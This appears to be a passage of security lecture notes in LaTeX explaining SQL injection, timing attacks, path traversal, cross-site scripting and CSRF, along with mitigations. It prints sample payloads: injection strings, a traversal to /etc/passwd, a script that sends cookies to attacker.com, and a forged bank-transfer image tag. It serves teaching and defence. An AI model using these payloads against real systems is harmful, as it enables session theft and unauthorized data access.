\section{SQL injection \& Cross Site Scripting}
\subsection{SQL Injection}
\paragraph{SQL Injection}

SQL injection occurs when an application incorporates user input directly into an SQL query without proper sanitization or parameterization.

\vspace{0.3em}

\textbf{Consequence:} an attacker may alter the structure of the query executed by the database.

\paragraph{Identifying a vulnerability}

The first step is usually to make assumptions about how the input is used by the application.

\vspace{0.3em}

For example, suppose the input is inserted into a \texttt{WHERE} clause:

\begin{lstlisting}[language=SQL]
SELECT * FROM users
WHERE username = '<input>';
\end{lstlisting}

\vspace{0.3em}

Special characters such as quotes (\texttt{'}) may reveal that user input is being interpreted as SQL code rather than as data.

\paragraph{Modifying query logic}

If a field is vulnerable, the attacker may inject a condition that always evaluates to true:

\begin{lstlisting}[language=SQL]
SELECT fieldlist FROM table
WHERE field = 'anything' OR 'x'='x';
\end{lstlisting}

\vspace{0.3em}

Since \texttt{'x'='x'} is always true, the query may return all rows of the table.

\paragraph{Schema discovery}

SQL injection can also be used to infer information about the database schema.

\vspace{0.3em}

\textbf{Column discovery}

\begin{itemize}
    \item Guess a column name.
    \item Use it in a condition such as \texttt{FIELD\_NAME IS NULL}.
    \item If an error occurs, the guessed column likely does not exist.
\end{itemize}

\vspace{0.3em}

\textbf{Table discovery}

\begin{lstlisting}[language=SQL]
x' AND 1=(SELECT COUNT(*)
          FROM SomeGuessedTableName); --'
\end{lstlisting}

\vspace{0.3em}

Differences in behavior or error messages may reveal whether the table exists.

\paragraph{Modifying the database}

In severe cases, SQL injection may allow the execution of additional SQL statements.

\vspace{0.3em}

Example: attempting to create a new user.

\begin{lstlisting}[language=SQL]
x'; INSERT INTO users
('email','passwd','login_id','name')
VALUES ('steve@unixwiz.net',
        'hello',
        'steve',
        'Steve Friedl'); --'
\end{lstlisting}

\vspace{0.3em}

Possible consequences include:

\begin{itemize}
    \item Authentication bypass.
    \item Disclosure of confidential data.
    \item Modification of existing records.
    \item Creation of new accounts.
    \item Administrative actions on the database.
\end{itemize}

\paragraph{Limitations of \texttt{INSERT} attacks}

Note that inserting a new user is often more difficult in practice:

\begin{itemize}
    \item The database account may not have \texttt{INSERT} privileges.
    \item The attacker may not know the exact schema of the table.
    \item Additional fields may be required.
    \item A valid user account may require entries in multiple tables (roles, permissions, access rights, etc.).
\end{itemize}

\vspace{0.3em}

Instead of an \texttt{INSERT}, an attacker may therefore attempt an \texttt{UPDATE} on an existing record.

\paragraph{Timing attacks}

Even if the attacker cannot directly read or modify data, SQL injection may still leak information through \textbf{side channels}.

\vspace{0.3em}

\textit{Idea:} execute an expensive operation only when a condition is true and measure the server's response time.


\vspace{0.3em}

Example:

\begin{itemize}
    \item If the first character of Bob's password is \texttt{A}, delay the query by several seconds.
    \item Measure the response time.
    \item A longer response indicates that the guess was correct.
\end{itemize}

By repeating this process for every position and every possible character, the entire password can eventually be reconstructed.

\paragraph{Other injection vulnerabilities}

Injection attacks are not limited to SQL. They occur whenever \textbf{unsanitized user input} is interpreted as code, commands, or file paths.

\vspace{0.3em}

Example: \textbf{Path Traversal}

\begin{lstlisting}
open("/path/to/pictures/" + imageName)
\end{lstlisting}

If the application does not validate \texttt{imageName}, an attacker may supply:

\begin{lstlisting}
../../../../../etc/passwd
\end{lstlisting}

and access files outside the intended directory.

\paragraph{Mitigation}

\begin{itemize}
    \item \textbf{Never trust external input.}
    \item Validate and sanitize user data.
    \item Apply the \textbf{principle of least privilege} to database accounts.
    \item Avoid exposing detailed error messages to users.
    \item Use \textbf{prepared statements}.
    \item Use \textbf{stored procedures} when appropriate.
\end{itemize}

\paragraph{Prepared Statements}

Instead of:

\begin{lstlisting}[language=Java]
String query =
"SELECT * FROM users WHERE name='" + n + "'";
\end{lstlisting}

use:

\begin{lstlisting}[language=Java]
String query =
"SELECT * FROM users WHERE name=?";
\end{lstlisting}

\vspace{0.3em}

\textbf{Key idea:}

\begin{itemize}
    \item The SQL query is parsed \emph{before} receiving the user input.
    \item User values are sent separately as parameters.
    \item Input is therefore treated as \textbf{data}, not as SQL code.
    \item Quotes, keywords and operators cannot alter the query structure.
\end{itemize}

\paragraph{Stored Procedures}

With stored procedures, the SQL logic resides inside the database:

\begin{lstlisting}[language=Java]
{call checkUsername(?)}
\end{lstlisting}

\vspace{0.3em}

The application can only provide parameters; it cannot modify the SQL logic implemented by the procedure itself.


\subsection{Cross-Site Scripting}

\paragraph{Sessions and cookies}

HTTP is a \textbf{stateless} protocol: each request is independent and the server has no built-in notion of a logged-in user.

\vspace{0.3em}

To implement sessions, a web application:

\begin{enumerate}
    \item Authenticates the user.
    \item Generates a random \textbf{session token}.
    \item Stores the token in a browser cookie.
    \item Receives the cookie in all subsequent requests.
\end{enumerate}

The session token therefore acts as a temporary proof of authentication.

\paragraph{Same-Origin Policy (SOP)}

A web page is normally only allowed to access data belonging to the \textbf{same origin}.

\vspace{0.3em}

An origin is defined by the triplet:

\[
(\texttt{protocol},\ \texttt{host},\ \texttt{port})
\]
\vspace{0.3em}
As a consequence, a malicious website cannot directly read another website's cookies, local storage, or page contents.


\paragraph{XSS: Key idea}

The goal of a Cross-Site Scripting attack is to execute attacker-controlled \texttt{JavaScript} inside a trusted website.



\vspace{0.3em}

For example, an attacker may submit the following review:

\begin{lstlisting}[language=HTML]
<script>
fetch("https://attacker.com/steal?c=" +
      encodeURIComponent(document.cookie));
</script>
\end{lstlisting}

If the website stores and displays this review without sanitization, the script will execute whenever another user views the page.
Since the code executes \emph{inside Amazon's page}, the browser considers it to originate from Amazon itself.

\paragraph{Persistent vs Reflected XSS}

\paragraph{Persistent XSS}

\begin{itemize}
    \item Malicious code is stored on the server (reviews, comments, profiles, etc.).
    \item Every visitor executes the injected code.
\end{itemize}

\vspace{0.3em}
\paragraph{Reflected (Non-persistent) XSS}

\begin{itemize}
    \item Malicious code is embedded in a crafted URL parameter.
    \item The victim must be convinced to visit the URL (e.g., through an email or social media post).
    \item The vulnerable web application must include the attacker-controlled parameter in the generated page without properly sanitizing or escaping it.    
    \item The attacker-controlled input is therefore \emph{reflected} by the server into the response.
    \item The injected JavaScript is immediately executed by the victim's browser.
\end{itemize}

\paragraph{Mitigation}

\begin{itemize}
    \item Validate and \textbf{sanitize} user input.
    \item Escape special HTML characters before inserting user input into the page (e.g., \texttt{<script>} becomes \texttt{\&lt;script\&gt;}).
    \item Use frameworks providing automatic output encoding.
    \item Store untrusted user content on a separate domain (eg: \url{googleusercontent.com})
    \item Use \textbf{XSS Filters}
    \item Use browser XSS protections and Content Security Policies (CSP).
\end{itemize}
\subsection{Cross-Site Request Forgery (CSRF)}

\paragraph{Key idea}

Unlike XSS, the attacker does not execute code inside the trusted website. Instead, they trick the victim's browser into sending an authenticated request to a website on which the victim is already logged in.

\vspace{0.3em}

The attack relies on the fact that browsers automatically include cookies associated with a website in every request sent to that website.

\paragraph{Example}

Suppose a user is logged into their online banking website and therefore possesses a valid session cookie.

\vspace{0.3em}

The user then visits a malicious website containing:

\begin{lstlisting}[language=HTML]
<img src=
"https://bank.com/transfer?
to=attacker&amount=10000">
\end{lstlisting}

When loading the image, the browser automatically sends:

\begin{itemize}
    \item The request to \texttt{bank.com}.
    \item The user's session cookie for \texttt{bank.com}.
\end{itemize}

The bank therefore receives what appears to be a legitimate authenticated request and may perform the transfer.

\paragraph{Difference with XSS}

\textbf{XSS}

\begin{itemize}
    \item The attacker injects JavaScript into the trusted website.
    \item The attacker's code executes with the website's privileges.
    \item Cookies and page contents may be accessed.
\end{itemize}

\vspace{0.3em}

\textbf{CSRF}

\begin{itemize}
    \item The attacker never gains access to the session cookie.
    \item The attacker simply causes the victim's browser to send a request.
    \item The browser automatically authenticates the request using the stored cookie.
\end{itemize}

\paragraph{Mitigation}

\begin{itemize}
    \item Verify the \texttt{Referer} or \texttt{Origin} header that informs the source of the request.
    \item Avoid performing sensitive actions through simple \texttt{GET} requests.
    \item Avoid storing session token as cookie but sending as normal parameter. This way it isn't included by browser automatically and thus attacker can't count on it.
\end{itemize}

